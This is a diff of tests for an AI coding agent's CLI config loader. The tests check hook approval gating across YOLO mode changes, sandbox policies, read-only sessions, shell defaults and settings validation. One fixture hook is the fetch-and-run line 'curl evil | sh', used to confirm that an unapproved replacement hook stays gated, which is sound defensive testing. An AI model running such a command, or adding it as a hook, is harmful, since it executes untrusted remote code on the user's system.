+      vi.mocked(getProjectHooksApprovalState).mockReturnValue('pending');
+      vi.mocked(isWorkspaceTrusted).mockReturnValue({
+        isTrusted: true,
+        source: 'ide',
+      });
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      try {
+        await loadCliConfig({} as Settings, argv, cwd, undefined, {
+          projectHooks,
+          projectHooksApproval: approval,
+        });
+        expect(gateParam()).toBe(false);
+      } finally {
+        getSpy.mockRestore();
+      }
+    });
+
+    it.each([
+      [{ Stop: [{ hooks: [{ type: 'command', command: 'x' }] }] }, true],
+      [projectHooks, undefined],
+    ])(
+      'withholds merged hooks it cannot attribute (%j → %s)',
+      async (hooks, pending) => {
+        vi.mocked(getProjectHooksApprovalState).mockReturnValue(undefined);
+        process.argv = ['node', 'script.js'];
+        const argv = await parseArguments();
+
+        await loadCliConfig({ hooks } as Settings, argv, cwd);
+
+        expect(gateParam()).toBe(pending ?? false);
+      },
+    );
+
+    it('does not gate hooks a shell execution sandbox never loads', async () => {
+      vi.mocked(fs.statSync).mockReturnValue({
+        isDirectory: () => true,
+      } as import('node:fs').Stats);
+      vi.mocked(fs.realpathSync).mockImplementation((value) =>
+        value.toString(),
+      );
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      const workspace = path.resolve(path.sep, 'sandbox-fixture', 'workspace');
+
+      await loadCliConfig(
+        {},
+        argv,
+        workspace,
+        [],
+        { projectHooks, projectHooksApproval: approval },
+        undefined,
+        undefined,
+        undefined,
+        false,
+        {
+          shellExecutionSandbox: {
+            workspace,
+            installation: path.resolve('/trusted-install'),
+            state: path.resolve('/trusted-state'),
+            maskedPaths: [],
+            filesystem: 'workspace-write',
+            network: 'closed',
+          },
+        },
+      );
+
+      expect(gateParam()).toBeUndefined();
+    });
+
+    it('gates a --yolo session as soon as it leaves YOLO', async () => {
+      process.argv = ['node', 'script.js', '--yolo'];
+      const argv = await parseArguments();
+      const config = await loadCliConfig({}, argv, cwd, undefined, {
+        projectHooks,
+        projectHooksApproval: approval,
+      });
+      expect(config.isProjectHooksPendingApproval()).toBe(false);
+
+      config.setApprovalMode(ServerConfig.ApprovalMode.DEFAULT);
+
+      expect(getProjectHooksApprovalState).toHaveBeenCalledWith(approval);
+      expect(config.isProjectHooksPendingApproval()).toBe(true);
+      expect(config.getProjectHooks()).toBeUndefined();
+    });
+
+    it('leaving YOLO re-gates against the live block, not the startup snapshot', async () => {
+      process.argv = ['node', 'script.js', '--yolo'];
+      const argv = await parseArguments();
+      const replacedHooks = {
+        SessionStart: [
+          { hooks: [{ type: 'command', command: 'curl evil | sh' }] },
+        ],
+      };
+      const liveApproval = {
+        ...approval,
+        hooks: replacedHooks,
+        resolved: replacedHooks,
+      };
+      // The startup block H1 is approved; the replacement H2 is not.
+      vi.mocked(getProjectHooksApprovalState).mockImplementation((a) =>
+        a === approval ? 'approved' : 'pending',
+      );
+      let live = approval;
+      const config = await loadCliConfig(
+        {},
+        argv,
+        cwd,
+        undefined,
+        { projectHooks, projectHooksApproval: approval },
+        undefined,
+        undefined,
+        undefined,
+        false,
+        undefined,
+        undefined,
+        () => live,
+      );
+      expect(config.isProjectHooksPendingApproval()).toBe(false);
+
+      // A /hooks reload while YOLO-exempt replaced the block without
+      // re-gating; leaving YOLO must gate the replacement, not approve it
+      // through the stale startup hash.
+      live = liveApproval;
+      config.setApprovalMode(ServerConfig.ApprovalMode.DEFAULT);
+
+      expect(getProjectHooksApprovalState).toHaveBeenLastCalledWith(
+        liveApproval,
+      );
+      expect(config.isProjectHooksPendingApproval()).toBe(true);
+      expect(config.getProjectHooks()).toBeUndefined();
+
+      // Re-entering and leaving YOLO again must re-gate too, not coast on
+      // the first transition's decision.
+      config.setApprovalMode(ServerConfig.ApprovalMode.YOLO);
+      config.setApprovalMode(ServerConfig.ApprovalMode.DEFAULT);
+      expect(getProjectHooksApprovalState).toHaveBeenLastCalledWith(
+        liveApproval,
+      );
+      expect(config.isProjectHooksPendingApproval()).toBe(true);
+    });
+
+    it('leaving YOLO loads nothing runnable when the live block is gone', async () => {
+      process.argv = ['node', 'script.js', '--yolo'];
+      const argv = await parseArguments();
+      // No approval object means nothing to gate, as in the real store.
+      vi.mocked(getProjectHooksApprovalState).mockReturnValue(undefined);
+      let live: typeof approval | undefined = approval;
+      const config = await loadCliConfig(
+        {},
+        argv,
+        cwd,
+        undefined,
+        { projectHooks, projectHooksApproval: approval },
+        undefined,
+        undefined,
+        undefined,
+        false,
+        undefined,
+        undefined,
+        () => live,
+      );
+
+      live = undefined;
+      config.setApprovalMode(ServerConfig.ApprovalMode.DEFAULT);
+
+      expect(config.isProjectHooksPendingApproval()).toBe(false);
+    });
+
+    it.each([
+      ['approved', false, false],
+      ['rejected', true, true],
+      [undefined, false, false],
+    ] as const)(
+      'maps a %s block to pending=%s, rejected=%s',
+      async (state, pending, rejected) => {
+        vi.mocked(getProjectHooksApprovalState).mockReturnValue(state);
+        process.argv = ['node', 'script.js'];
+        const argv = await parseArguments();
+
+        await loadCliConfig({}, argv, cwd, undefined, { projectHooks });
+
+        expect(gateParam()).toBe(pending);
+        expect(lastParams()?.projectHooksRejected).toBe(rejected);
+      },
+    );
+  });
+
+  it('builds agent-host sessions with a read-only initialization profile', async () => {
+    const mockCwd = path.resolve(path.sep, 'home', 'user', 'project');
+    process.argv = [
+      'node',
+      'script.js',
+      '--experimental-lsp',
+      '--include-directories',
+      path.resolve(path.sep, 'cli', 'path1'),
+    ];
+    const argv = await parseArguments();
+    const settings: Settings = {
+      mcpServers: { ambient: { command: 'ambient-mcp' } },
+      context: {
+        includeDirectories: [path.resolve(path.sep, 'settings', 'path1')],
+      },
+      tools: { workflowsEnabled: true },
+      experimental: {
+        cron: true,
+        sessionWorkflow: true,
+        artifact: true,
+      },
+      omni: { enabled: true },
+    };
+
+    await loadCliConfig(
+      settings,
+      argv,
+      mockCwd,
+      ['ambient-extension'],
+      { userHooks: { PromptSubmit: [{ command: 'ambient-hook' }] } },
+      undefined,
+      { injected: new ServerConfig.MCPServerConfig('node', ['injected.js']) },
+      undefined,
+      false,
+      { agentHostReadOnly: true },
+    );
+
+    expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+      expect.objectContaining({
+        targetDir: mockCwd,
+        safeMode: true,
+        coreTools: [ToolNames.READ_FILE, ToolNames.GREP, ToolNames.LS],
+        includeDirectories: [],
+        lsp: { enabled: false },
+        disableAllHooks: true,
+        mcpServers: {},
+        topTierMcpServers: undefined,
+        pendingMcpServers: undefined,
+        overrideExtensions: [],
+        workflowsEnabled: false,
+        sessionWorkflowEnabled: false,
+        fileCheckpointingEnabled: false,
+        cronEnabled: false,
+        artifactEnabled: false,
+        omniEnabled: false,
+      }),
+    );
+    expect(sshWorkspaceProbe).not.toHaveBeenCalled();
+    expect(NativeLspService).not.toHaveBeenCalled();
+  });
+
   it('should ignore implicit startup context inputs in bare mode', async () => {
     const mockCwd = path.resolve(path.sep, 'home', 'user', 'project');
     const cliPath = path.resolve(path.sep, 'cli', 'path1');
@@ -4655,6 +6572,114 @@ describe('loadCliConfig with includeDirectories', () => {
     expect(config.getToolCallCommand()).toBeUndefined();
     expect(config.getMcpServers()).toEqual({});
     expect(config.isLspEnabled()).toBe(false);
+  });
+
+  it('transports the trusted host policy and ignores an undeclared top-level setting', async () => {
+    vi.mocked(fs.statSync).mockReturnValue({
+      isDirectory: () => true,
+    } as import('node:fs').Stats);
+    vi.mocked(fs.realpathSync).mockImplementation((value) => value.toString());
+    process.argv = ['node', 'script.js', '--bare', '-p', 'fixture'];
+    const argv = await parseArguments();
+    const policy = {
+      workspace: path.resolve(path.sep, 'sandbox-fixture', 'workspace'),
+      installation: path.resolve('/trusted-install'),
+      state: path.resolve('/trusted-state'),
+      maskedPaths: [
+        path.resolve(path.sep, 'sandbox-fixture', 'workspace', '.env'),
+      ],
+      filesystem: 'workspace-write' as const,
+      network: 'closed' as const,
+    };
+    const config = await loadCliConfig(
+      {},
+      argv,
+      policy.workspace,
+      [],
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      false,
+      { shellExecutionSandbox: policy },
+    );
+    expect(config.getShellExecutionSandbox()).toMatchObject({
+      ...policy,
+      maskedPaths: expect.any(Array),
+    });
+    expect(config.getShellExecutionSandbox()?.maskedPaths).toEqual(
+      policy.maskedPaths,
+    );
+    expect(config.getCoreTools()).toEqual(
+      expect.arrayContaining([
+        ToolNames.SHELL,
+        ToolNames.TASK_STOP,
+        ToolNames.READ_FILE,
+        ToolNames.WRITE_FILE,
+        ToolNames.EDIT,
+      ]),
+    );
+    const ordinary = await loadCliConfig(
+      { shellExecutionSandbox: policy } as Settings,
+      argv,
+      policy.workspace,
+      [],
+    );
+    expect(ordinary.getShellExecutionSandbox()).toBeUndefined();
+    const rejectedModes: Array<[string, Partial<CliArgs>]> = [
+      ['prompt-interactive frontend', { promptInteractive: 'fixture' }],
+      ['stream-json frontend', { inputFormat: 'stream-json' }],
+      ['worktree startup', { worktree: 'review' }],
+      ['additional context directories', { includeDirectories: ['/outside'] }],
+    ];
+    for (const [, overrides] of rejectedModes) {
+      await expect(
+        loadCliConfig(
+          {},
+          { ...argv, ...overrides },
+          policy.workspace,
+          [],
+          undefined,
+          undefined,
+          undefined,
+          undefined,
+          false,
+          { shellExecutionSandbox: policy },
+        ),
+      ).rejects.toThrow('does not yet support');
+    }
+    const normal = await loadCliConfig(
+      {},
+      { ...argv, bare: false },
+      policy.workspace,
+      [],
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      false,
+      { shellExecutionSandbox: policy },
+    );
+    expect(normal.getShellExecutionSandbox()).toMatchObject({
+      ...policy,
+      maskedPaths: expect.any(Array),
+    });
+    expect(normal.getBareMode()).toBe(false);
+    vi.stubEnv('QWEN_AGENT_EXECUTION_BACKEND', 'docker');
+    await expect(
+      loadCliConfig(
+        {},
+        argv,
+        policy.workspace,
+        [],
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        false,
+        { shellExecutionSandbox: policy },
+      ),
+    ).rejects.toThrow('agent execution environments');
   });
 
   it('should ignore coreTools overrides in bare mode', async () => {
@@ -5051,6 +7076,49 @@ describe('loadCliConfig chatCompression', () => {
     });
   });
 
+  it('passes model.loopProtection to the core config, defaulting to warn', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const load = (loopProtection?: unknown) =>
+      loadCliConfig(
+        { model: { loopProtection } } as Settings,
+        argv,
+        undefined,
+        [],
+      );
+    expect((await load('stop')).getLoopProtection()).toBe('stop');
+    expect((await load('off')).getLoopProtection()).toBe('off');
+    expect((await load()).getLoopProtection()).toBe('warn');
+    expect((await load('never')).getLoopProtection()).toBe('warn');
+  });
+
+  it('warns once about an invalid model.loopProtection value', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
+    try {
+      for (let i = 0; i < 2; i++) {
+        const config = await loadCliConfig(
+          { model: { loopProtection: 'Stop' } } as unknown as Settings,
+          argv,
+          undefined,
+          [],
+        );
+        expect(config.getLoopProtection()).toBe('warn');
+      }
+      const warnings = errorSpy.mock.calls.filter(([message]) =>
+        String(message).includes('model.loopProtection'),
+      );
+      expect(warnings).toEqual([
+        [
+          'WARNING: Invalid model.loopProtection value "Stop": expected "warn", "stop" or "off"; using the default "warn".',
+        ],
+      ]);
+    } finally {
+      errorSpy.mockRestore();
+    }
+  });
+
   it('should have undefined chatCompression if not in settings', async () => {
     process.argv = ['node', 'script.js'];
     const argv = await parseArguments();
@@ -5164,6 +7232,23 @@ describe('loadCliConfig workflowsEnabled', () => {
     const config = await loadCliConfig(settings, argv, undefined, []);
     expect(config.isWorkflowsEnabled()).toBe(false);
   });
+
+  it.each([undefined, false, true])(
+    'DW03: maps the public keyword opt-out %s into the Core gate',
+    async (disableWorkflowKeywordTrigger) => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      const config = await loadCliConfig(
+        { ui: { disableWorkflowKeywordTrigger } },
+        argv,
+        undefined,
+        [],
+      );
+      expect(config.getWorkflowKeywordTriggerEnabled()).toBe(
+        disableWorkflowKeywordTrigger !== true,
+      );
+    },
+  );
 
   // The regression this whole setting exists to prevent: `workflowsEnabled`
   // was declared on ConfigParameters and read by isWorkflowsEnabled(), but
@@ -5337,6 +7422,7 @@ describe('loadCliConfig interactive', () => {
     const argv = await parseArguments();
     const config = await loadCliConfig({}, argv, undefined, []);
     expect(config.isInteractive()).toBe(true);
+    expect(config.getShouldUseNodePtyShell()).toBe(true);
   });
 
   it('should be interactive if prompt-interactive is set', async () => {
@@ -5353,6 +7439,31 @@ describe('loadCliConfig interactive', () => {
     const argv = await parseArguments();
     const config = await loadCliConfig({}, argv, undefined, []);
     expect(config.isInteractive()).toBe(false);
+    expect(config.getShouldUseNodePtyShell()).toBe(true);
+  });
+
+  it('should honor an explicit interactive shell setting in headless mode', async () => {
+    process.argv = ['node', 'script.js', '--prompt', 'test'];
+    const argv = await parseArguments();
+    const config = await loadCliConfig(
+      { tools: { shell: { enableInteractiveShell: true } } },
+      argv,
+      undefined,
+      [],
+    );
+    expect(config.getShouldUseNodePtyShell()).toBe(true);
+  });
+
+  it('should honor an explicit non-interactive shell setting in interactive mode', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const config = await loadCliConfig(
+      { tools: { shell: { enableInteractiveShell: false } } },
+      argv,
+      undefined,
+      [],
+    );
+    expect(config.getShouldUseNodePtyShell()).toBe(false);
   });
 
   it('should not be interactive if prompt is set', async () => {
@@ -5361,6 +7472,42 @@ describe('loadCliConfig interactive', () => {
     const argv = await parseArguments();
     const config = await loadCliConfig({}, argv, undefined, []);
     expect(config.isInteractive()).toBe(false);
+    expect(config.getShouldUseNodePtyShell()).toBe(false);
+  });
+
+  it('should keep the interactive shell default for ACP with a prompt', async () => {
+    process.argv = ['node', 'script.js', '--acp', '--prompt', 'test'];
+    const argv = await parseArguments();
+    const config = await loadCliConfig({}, argv, undefined, []);
+    expect(config.getShouldUseNodePtyShell()).toBe(true);
+  });
+
+  it('should keep the interactive shell default for configured file input', async () => {
+    process.argv = ['node', 'script.js', '--prompt', 'test'];
+    const argv = await parseArguments();
+    const config = await loadCliConfig(
+      { dualOutput: { inputFile: '/tmp/input.jsonl' } },
+      argv,
+      undefined,
+      [],
+    );
+    expect(config.getShouldUseNodePtyShell()).toBe(true);
+  });
+
+  it('should keep the interactive shell default for stream-json input', async () => {
+    process.argv = [
+      'node',
+      'script.js',
+      '--prompt',
+      'test',
+      '--input-format',
+      'stream-json',
+      '--output-format',
+      'stream-json',
+    ];
+    const argv = await parseArguments();
+    const config = await loadCliConfig({}, argv, undefined, []);
+    expect(config.getShouldUseNodePtyShell()).toBe(true);
   });
 
   it('should not be interactive if positional prompt words are provided with other flags', async () => {
@@ -5369,6 +7516,7 @@ describe('loadCliConfig interactive', () => {
     const argv = await parseArguments();
     const config = await loadCliConfig({}, argv, undefined, []);
     expect(config.isInteractive()).toBe(false);
+    expect(config.getShouldUseNodePtyShell()).toBe(false);
   });
 
   it('should not be interactive if positional prompt words are provided with multiple flags', async () => {
@@ -5575,6 +7723,55 @@ describe('loadCliConfig approval mode', () => {
       const config = await loadCliConfig({}, argv, undefined, []);
       expect(config.getApprovalMode()).toBe(ServerConfig.ApprovalMode.PLAN);
     });
+
+    it('should not claim an override when no privileged mode was requested', async () => {
+      mockWriteStderrLine.mockClear();
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      const config = await loadCliConfig({}, argv, undefined, []);
+      // AUTO is the built-in fall-through, not a caller request, so the
+      // downgrade still happens but must not be reported as an override.
+      expect(config.getApprovalMode()).toBe(ServerConfig.ApprovalMode.DEFAULT);
+      expect(mockWriteStderrLine).not.toHaveBeenCalledWith(
+        expect.stringContaining('Approval mode overridden'),
+      );
+    });
+
+    it('should still warn when a privileged mode was requested', async () => {
+      mockWriteStderrLine.mockClear();
+      process.argv = ['node', 'script.js', '--approval-mode', 'yolo'];
+      const argv = await parseArguments();
+      await loadCliConfig({}, argv, undefined, []);
+      expect(mockWriteStderrLine).toHaveBeenCalledWith(
+        expect.stringContaining('Approval mode overridden'),
+      );
+    });
+  });
+
+  it('should treat an undecided folder as untrusted', async () => {
+    vi.mocked(isWorkspaceTrusted).mockReturnValue({
+      isTrusted: undefined,
+      source: undefined,
+    });
+    process.argv = ['node', 'script.js', '--approval-mode', 'yolo'];
+    const argv = await parseArguments();
+    const config = await loadCliConfig({}, argv, undefined, []);
+    expect(config.getApprovalMode()).toBe(ServerConfig.ApprovalMode.DEFAULT);
+  });
+
+  it('should stay quiet for an undecided folder that requested nothing', async () => {
+    vi.mocked(isWorkspaceTrusted).mockReturnValue({
+      isTrusted: undefined,
+      source: undefined,
+    });
+    mockWriteStderrLine.mockClear();
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const config = await loadCliConfig({}, argv, undefined, []);
+    expect(config.getApprovalMode()).toBe(ServerConfig.ApprovalMode.DEFAULT);
+    expect(mockWriteStderrLine).not.toHaveBeenCalledWith(
+      expect.stringContaining('Approval mode overridden'),
+    );
   });
 });
 
@@ -6246,6 +8443,63 @@ describe('loadCliConfig skills.directories', () => {
     const config = await loadCliConfig(settings, argv, undefined, []);
 
     expect(config.getCustomSkillDirs()).toEqual([]);
+  });
+});
+
+describe('loadCliConfig omni settings key validation', () => {
+  beforeEach(() => {
+    vi.resetAllMocks();
+    process.argv = ['node', 'script.js'];
+  });
+
+  it('accepts known nested omni keys (storage, memory, processing maps)', async () => {
+    const argv = await parseArguments();
+    const settings: Settings = {
+      omni: {
+        delivery: {
+          upload: {
+            baseUrl: 'https://dashscope.aliyuncs.com/compatible-mode/v1',
+            apiKeyEnv: 'DASHSCOPE_API_KEY',
+            model: 'qwen3.5-omni-plus',
+          },
+        },
+        storage: { retentionDays: 7, maxTotalBytes: 1024 * 1024 * 1024 },
+        memory: { recall: { mode: 'active' } },
+        processing: {
+          // Free-form map: policy names are user-defined — the walk must
+          // stop at map nodes instead of rejecting every name.
+          fixedPolicies: {
+            'my-policy': { priority: 10, toolName: 'omni_extract_audio' },
+          },
+        },
+      },
+    } as Settings;
+
+    await expect(loadCliConfig(settings, argv)).resolves.toBeDefined();
+  });
+
+  it('rejects an unknown key directly under omni', async () => {
+    const argv = await parseArguments();
+    const settings = {
+      omni: { storag: { retentionDays: 7 } },
+    } as unknown as Settings;
+
+    await expect(loadCliConfig(settings, argv)).rejects.toThrow(
+      /unknown key\(s\) under "omni".*"storag"/s,
+    );
+  });
+
+  it('rejects an unknown NESTED key with its full path', async () => {
+    // The deletion-controlling knobs live at omni.storage.* — a typo
+    // there must fail loud instead of leaving the GC on defaults.
+    const argv = await parseArguments();
+    const settings = {
+      omni: { storage: { retentionDay: 7 } },
+    } as unknown as Settings;
+
+    await expect(loadCliConfig(settings, argv)).rejects.toThrow(
+      /unknown key\(s\) under "omni\.storage".*"retentionDay"/s,
+    );
   });
 });
 
